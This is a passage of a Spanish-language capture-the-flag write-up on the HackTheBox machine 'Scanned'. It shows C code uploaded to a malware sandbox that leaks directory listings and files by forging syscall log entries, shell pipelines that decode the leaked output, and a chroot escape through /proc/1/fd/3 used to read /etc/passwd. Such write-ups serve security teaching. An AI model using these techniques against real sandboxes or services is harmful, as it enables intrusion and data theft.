  Applying sessions.0001_initial... <span class="code-green">OK</span>

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">manage.py</span> runserver
Watching for file changes with StatReloader
Performing system checks...

System check identified no issues (0 silenced).
Django version 3.2.6, using settings 'malscanner.settings'
Starting development server at http://127.0.0.1:8000/
Quit the server with CONTROL-C.
</code></pre></div><p>Como los escapes de <code>chroot</code> tradicionales no funcionan, vamos a hacer cosas más sencillas. Por ejemplo, podemos tratar de listar directorios desde la perspectiva del <em>malware</em> con este <em>script</em> en C:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;dirent.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk1">DIR</span><span class="mtk5">*</span> <span class="mtk1">dr;</span>
  <span class="mtk7 mtki">struct</span> <span class="mtk1">dirent</span> <span class="mtk5">*</span><span class="mtk1">de;</span>

  <span class="mtk1">dr</span> <span class="mtk5">=</span> <span class="mtk8">opendir</span><span class="mtk1">(</span><span class="mtk4">"."</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(dr</span> <span class="mtk5">==</span> <span class="mtk6">NULL</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Could</span> <span class="mtk4">not</span> <span class="mtk4">open</span> <span class="mtk4">current</span> <span class="mtk4">directory"</span><span class="mtk1">);</span>  
    <span class="mtk5">return</span> <span class="mtk6">1</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>

  <span class="mtk5">while</span> <span class="mtk1">((de</span> <span class="mtk5">=</span> <span class="mtk8">readdir</span><span class="mtk1">(dr))</span> <span class="mtk5">!=</span> <span class="mtk6">NULL</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">de-&gt;d_name);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">closedir</span><span class="mtk1">(dr);</span>

  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Lo compilamos y lo subimos y vemos la siguiente salida en el <em>log</em> del servidor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[] <span class="code-dark-green">"GET /scanner/upload HTTP/1.1" 301 0</span>
[] "GET /scanner/upload/ HTTP/1.1" 200 2189
usr
.
lib
userprog
bin
proc
..
lib64
log
Exited
[] <span class="code-dark-green">"POST /scanner/upload/ HTTP/1.1" 302 0</span>
[] <span class="code-dark-green">"GET /viewer/ce6407480db61da2177849329f4aeb83 HTTP/1.1" 301 0</span>
[] "GET /viewer/ce6407480db61da2177849329f4aeb83/ HTTP/1.1" 200 18239  
</code></pre></div><p>Genial, tenemos esos archivos y directorios. Podemos seguir enumerando el sistema de archivos localmente desde el <em>log</em> del servidor, pero al final tendremos que encontrar una manera de obtener una salida.</p><p>De hecho, una manera muy ingeniosa es utilizando el archivo <code>log</code>. Podemos introducir la información que queremos exfiltrar como si fuera una instrucción <code>syscall</code> en <code>log</code>, de manera que el servidor lo muestre en el reporte. Luego, podremos extraer la información:</p><p>Podemos hacer uso de las mismas funciones que hay en <code>tracing.c</code> del código fuente y escribir en el archivo <code>log</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;dirent.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;fcntl.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>

<span class="mtk5">typedef</span> <span class="mtk7 mtki">struct</span> <span class="mtk8">__attribute__</span><span class="mtk1">((__packed__))</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">rax;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">rdi;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">rsi;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">rdx;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">r10;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">r8;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">r9;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">ret;</span>
<span class="mtk1">}</span> <span class="mtk1">registers;</span>

<span class="mtk7 mtki">void</span> <span class="mtk8">log_syscall</span><span class="mtk1">(registers</span> <span class="mtk9 mtki">regs</span><span class="mtk1">,</span> <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk9 mtki">ret</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk1">registers</span> <span class="mtk1">result;</span>
  <span class="mtk1">result.rax</span> <span class="mtk5">=</span> <span class="mtk1">regs.rax;</span>
  <span class="mtk1">result.rdi</span> <span class="mtk5">=</span> <span class="mtk1">regs.rdi;</span>
  <span class="mtk1">result.rsi</span> <span class="mtk5">=</span> <span class="mtk1">regs.rsi;</span>
  <span class="mtk1">result.rdx</span> <span class="mtk5">=</span> <span class="mtk1">regs.rdx;</span>
  <span class="mtk1">result.r10</span> <span class="mtk5">=</span> <span class="mtk1">regs.r10;</span>
  <span class="mtk1">result.r8</span> <span class="mtk5">=</span> <span class="mtk1">regs.r8;</span>
  <span class="mtk1">result.r9</span> <span class="mtk5">=</span> <span class="mtk1">regs.r9;</span>
  <span class="mtk1">result.ret</span> <span class="mtk5">=</span> <span class="mtk1">ret;</span>

  <span class="mtk7 mtki">int</span> <span class="mtk1">fd</span> <span class="mtk5">=</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/log"</span><span class="mtk1">,</span> <span class="mtk1">O_CREAT</span><span class="mtk5">|</span><span class="mtk1">O_RDWR</span><span class="mtk5">|</span><span class="mtk1">O_APPEND,</span> <span class="mtk5">0</span><span class="mtk6">777</span><span class="mtk1">);</span>  

  <span class="mtk5">if</span> <span class="mtk1">(fd</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk5">return</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>

  <span class="mtk8">write</span><span class="mtk1">(fd,</span> <span class="mtk5">&amp;</span><span class="mtk1">result,</span> <span class="mtk5">sizeof</span><span class="mtk1">(registers));</span>
  <span class="mtk8">close</span><span class="mtk1">(fd);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk1">DIR</span><span class="mtk5">*</span> <span class="mtk1">dr;</span>
  <span class="mtk7 mtki">struct</span> <span class="mtk1">dirent</span> <span class="mtk5">*</span><span class="mtk1">de;</span>
  <span class="mtk1">registers</span> <span class="mtk1">regs;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">ret;</span>

  <span class="mtk1">regs.rax</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">3b</span><span class="mtk1">;</span>
  <span class="mtk1">regs.rdi</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">41414141</span><span class="mtk1">;</span>
  <span class="mtk1">regs.rsi</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">42424242</span><span class="mtk1">;</span>
  <span class="mtk1">regs.rdx</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">43434343</span><span class="mtk1">;</span>
  <span class="mtk1">regs.r10</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">44444444</span><span class="mtk1">;</span>
  <span class="mtk1">regs.r8</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">45454545</span><span class="mtk1">;</span>
  <span class="mtk1">regs.r9</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">46464646</span><span class="mtk1">;</span>
  <span class="mtk1">ret</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">47474747</span><span class="mtk1">;</span>

  <span class="mtk1">dr</span> <span class="mtk5">=</span> <span class="mtk8">opendir</span><span class="mtk1">(</span><span class="mtk4">"."</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(dr</span> <span class="mtk5">==</span> <span class="mtk6">NULL</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Could</span> <span class="mtk4">not</span> <span class="mtk4">open</span> <span class="mtk4">current</span> <span class="mtk4">directory"</span><span class="mtk1">);</span>
    <span class="mtk5">return</span> <span class="mtk6">1</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>

  <span class="mtk5">while</span> <span class="mtk1">((de</span> <span class="mtk5">=</span> <span class="mtk8">readdir</span><span class="mtk1">(dr))</span> <span class="mtk5">!=</span> <span class="mtk6">NULL</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">de-&gt;d_name);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">log_syscall</span><span class="mtk1">(regs,</span> <span class="mtk1">ret);</span>
  <span class="mtk8">closedir</span><span class="mtk1">(dr);</span>

  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>El <em>script</em> anterior registrará un <code>sys_execve</code> (<code>$rax = 0x3b</code>) usando números reconocibles como valores de registros. Si lo subimos y miramos la salida, veremos que la instrucción <code>syscall</code> se reporta:</p><p><img src="/images/HTB/Scanned/Scanned-local-report-test.png" alt="Scanned local report test"></p><p>Se ve que no todos los registros se muestran. Eso es porque <code>sys_execve</code> solamente necesita tres argumentos. Si quisiéramos más, podríamos haber usado <code>sys_clone</code>, que usa cinco registros, pero yo seguiré usando <code>sys_execve</code>, ya que solamente usaré <code>ret</code> como salida.</p><p>Ahora tenemos que parsear la información que queremos exfiltrar como valores hexadecimales y poner en <code>ret</code> el valor correspondiente. Esto es un ejemplo para exfiltrar el listado de directorios:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;dirent.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;fcntl.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>

<span class="mtk5">typedef</span> <span class="mtk7 mtki">struct</span> <span class="mtk8">__attribute__</span><span class="mtk1">((__packed__))</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">rax;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">rdi;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">rsi;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">rdx;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">r10;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">r8;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">r9;</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">ret;</span>
<span class="mtk1">}</span> <span class="mtk1">registers;</span>

<span class="mtk7 mtki">void</span> <span class="mtk8">log_syscall</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk9 mtki">ret</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk1">registers</span> <span class="mtk1">result;</span>

  <span class="mtk1">result.rax</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">3b</span><span class="mtk1">;</span>
  <span class="mtk1">result.rdi</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">result.rsi</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">result.rdx</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">result.r10</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">result.r8</span>  <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">result.r9</span>  <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">result.ret</span> <span class="mtk5">=</span> <span class="mtk1">ret;</span>

  <span class="mtk7 mtki">int</span> <span class="mtk1">fd</span> <span class="mtk5">=</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/log"</span><span class="mtk1">,</span> <span class="mtk1">O_CREAT</span><span class="mtk5">|</span><span class="mtk1">O_RDWR</span><span class="mtk5">|</span><span class="mtk1">O_APPEND,</span> <span class="mtk5">0</span><span class="mtk6">777</span><span class="mtk1">);</span>  

  <span class="mtk5">if</span> <span class="mtk1">(fd</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk5">return</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>

  <span class="mtk8">write</span><span class="mtk1">(fd,</span> <span class="mtk5">&amp;</span><span class="mtk1">result,</span> <span class="mtk5">sizeof</span><span class="mtk1">(registers));</span>
  <span class="mtk8">close</span><span class="mtk1">(fd);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">void</span> <span class="mtk8">read_file</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk5">*</span> <span class="mtk9 mtki">path</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk1">ret</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk5">l</span><span class="mtk1">;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">ret_string[</span><span class="mtk6">8</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk1">{</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">};</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">fd</span> <span class="mtk5">=</span> <span class="mtk8">open</span><span class="mtk1">(path,</span> <span class="mtk1">O_RDONLY);</span>

  <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk8">read</span><span class="mtk1">(fd,</span> <span class="mtk1">ret_string,</span> <span class="mtk6">8</span><span class="mtk1">))</span> <span class="mtk1">{</span>
    <span class="mtk1">ret</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk5">l</span><span class="mtk1">;</span>

    <span class="mtk5">for</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk1">i</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span> <span class="mtk1">i</span> <span class="mtk5">&lt;</span> <span class="mtk6">8</span><span class="mtk1">;</span> <span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk1">ret</span> <span class="mtk5">&lt;&lt;=</span> <span class="mtk6">8</span><span class="mtk1">;</span>
      <span class="mtk1">ret</span> <span class="mtk5">+=</span> <span class="mtk1">ret_string[i];</span>
      <span class="mtk1">ret_string[i]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
    <span class="mtk1">}</span>

    <span class="mtk8">log_syscall</span><span class="mtk1">(ret);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">close</span><span class="mtk1">(fd);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk1">DIR</span><span class="mtk5">*</span> <span class="mtk1">dr;</span>
  <span class="mtk7 mtki">struct</span> <span class="mtk1">dirent</span> <span class="mtk5">*</span><span class="mtk1">de;</span>
  <span class="mtk1">FILE</span><span class="mtk5">*</span> <span class="mtk1">fp;</span>

  <span class="mtk1">fp</span> <span class="mtk5">=</span> <span class="mtk8">fopen</span><span class="mtk1">(</span><span class="mtk4">"tmp_file"</span><span class="mtk1">,</span> <span class="mtk4">"wb"</span><span class="mtk1">);</span>
  <span class="mtk1">dr</span> <span class="mtk5">=</span> <span class="mtk8">opendir</span><span class="mtk1">(</span><span class="mtk4">"."</span><span class="mtk1">);</span>

  <span class="mtk5">while</span> <span class="mtk1">((de</span> <span class="mtk5">=</span> <span class="mtk8">readdir</span><span class="mtk1">(dr))</span> <span class="mtk5">!=</span> <span class="mtk6">NULL</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">fprintf</span><span class="mtk1">(fp,</span> <span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">de-&gt;d_name);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">closedir</span><span class="mtk1">(dr);</span>
  <span class="mtk8">fclose</span><span class="mtk1">(fp);</span>

  <span class="mtk8">read_file</span><span class="mtk1">(</span><span class="mtk4">"tmp_file"</span><span class="mtk1">);</span>

  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p><img src="/images/HTB/Scanned/Scanned-exfiltration.png" alt="Scanned exfiltration"></p><p>Con <code>curl</code> y algo de filtrado, podemos extraer la información:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class="code-dark-green">grep</span> execve
&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class="code-red">execve</span>(0x0, 0x0, 0x0) = 0x7573720a2e0a746d&lt;/pre&gt;
&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class="code-red">execve</span>(0x0, 0x0, 0x0) = 0x705f66696c650a6c&lt;/pre&gt;
&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class="code-red">execve</span>(0x0, 0x0, 0x0) = 0x69620a7573657270&lt;/pre&gt;
&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class="code-red">execve</span>(0x0, 0x0, 0x0) = 0x726f670a62696e0a&lt;/pre&gt;
&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class="code-red">execve</span>(0x0, 0x0, 0x0) = 0x70726f630a2e2e0a&lt;/pre&gt;
&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class="code-red">execve</span>(0x0, 0x0, 0x0) = 0x6c696236340a6c6f&lt;/pre&gt;
&lt;p style="font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;"&gt;<span class="code-red">execve</span>(0x0, 0x0, 0x0) = 0x670a000000000000&lt;/pre&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class="code-dark-green">grep</span> execve | <span class="code-dark-green">awk</span> -F = <span class="code-dark-yellow">'{ print $3 }'</span>
 0x7573720a2e0a746d&lt;/pre&gt;
 0x705f66696c650a6c&lt;/pre&gt;
 0x69620a7573657270&lt;/pre&gt;
 0x726f670a62696e0a&lt;/pre&gt;
 0x70726f630a2e2e0a&lt;/pre&gt;
 0x6c696236340a6c6f&lt;/pre&gt;
 0x670a000000000000&lt;/pre&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class="code-dark-green">grep</span> execve | <span class="code-dark-green">awk</span> -F = <span class="code-dark-yellow">'{ print $3 }'</span> | <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/&lt;\/pre&gt;//g'</span>
 0x7573720a2e0a746d
 0x705f66696c650a6c
 0x69620a7573657270
 0x726f670a62696e0a
 0x70726f630a2e2e0a
 0x6c696236340a6c6f
 0x670a000000000000

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class="code-dark-green">grep</span> execve | <span class="code-dark-green">awk</span> -F = <span class="code-dark-yellow">'{ print $3 }'</span> | <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/&lt;\/pre&gt;//g'</span> | <span class="code-dark-green">awk</span> -F x <span class="code-dark-yellow">'{ printf "%16s\n", $2 }'</span>
7573720a2e0a746d
705f66696c650a6c
69620a7573657270
726f670a62696e0a
70726f630a2e2e0a
6c696236340a6c6f
670a000000000000

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | <span class="code-dark-green">grep</span> execve | <span class="code-dark-green">awk</span> -F = <span class="code-dark-yellow">'{ print $3 }'</span> | <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/&lt;\/pre&gt;//g'</span> | <span class="code-dark-green">awk</span> -F x <span class="code-dark-yellow">'{ printf "%16s\n", $2 }'</span> | <span class="code-dark-green">xxd</span> -r -p  
usr
.
tmp_file
lib
userprog
bin
proc
..
lib64
log
</code></pre></div><p>Podemos seguir el mismo proceso para leer archivos del entorno de <em>sandbox</em>. Al final, decidí utilizar un <em>script</em> en Bash que compile el binario con el archivo a leer o el directorio a listar, lo sube y extrae la información de manera automática. El <em>script</em> se llama <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Scanned/exploit.sh"><code>exploit.sh</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Scanned#exploitsh">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span>
[!] Usage: bash exploit.sh &lt;host&gt; &lt;f|d&gt; &lt;path-to-file|dir&gt;  

<span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 127.0.0.1:8000 d /
usr
.
tmp_file
lib
userprog
bin
proc
..
lib64
log
</code></pre></div><p>En este punto podemos comenzar a enumerar el directorio <code>/proc</code> de la máquina remota. Como se explicó antes, hay una mala configuración porque el binario <code>sandbox</code> monta el directorio <code>/proc</code> en el entorno de <code>chroot</code>, lo que lo hace accesible desde la <em>sandbox</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 d /proc  
.
..
fb
fs
bus
dma
irq
mpt
net
sys
tty
acpi
keys
kmsg
misc
mtrr
stat
iomem
kcore
locks
swaps
crypto
driver
mounts
uptime
vmstat
cgroups
cmdline
cpuinfo
devices
ioports
loadavg
meminfo
modules
sysvipc
version
consoles
kallsyms
pressure
slabinfo
softirqs
zoneinfo
buddyinfo
diskstats
key-users
schedstat
interrupts
kpagecount
kpageflags
partitions
timer_list
execdomains
filesystems
kpagecgroup
sched_debug
vmallocinfo
pagetypeinfo
dynamic_debug
sysrq-trigger
self
thread-self
1
2
3
</code></pre></div><p>Hay tres identificadores de proceso (PID) diferentes: <code>1</code>, <code>2</code> y <code>3</code>. Podemos listar los descriptores de archivo usados por dichos PID:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 d /proc/1/fd  
.
..
0
1
2
3

<span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 d /proc/2/fd
.
..
0
1
2
3
4

<span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 d /proc/3/fd
.
..
0
1
2
3
</code></pre></div><p>Aquí hay que darse cuenta de que si listamos el descriptor de archivo número <code>3</code> (como directorio), estaremos listando el directorio <code>jails</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 d /proc/1/fd/3  
7d431ab8af5ab635e048e40f36f69536
.
720e0160ff47fcd4da968b89de05d5e9
..

<span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 d /proc/3/fd/3
.
720e0160ff47fcd4da968b89de05d5e9
..
</code></pre></div><p>Por alguna razón, se obtiene más información con <code>/proc/1/fd/3</code>, por lo que continuaré usando este. De hecho, podemos escalar directorios hacia arriba, escapando del entorno de <code>chroot</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 d /proc/1/fd/3/..
jails
.
..
sandbox

<span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 f /proc/1/fd/3/../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
clarence:x:1000:1000:clarence,,,:/home/clarence:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sandbox:x:1001:1001::/home/sandbox:/usr/sbin/nologin
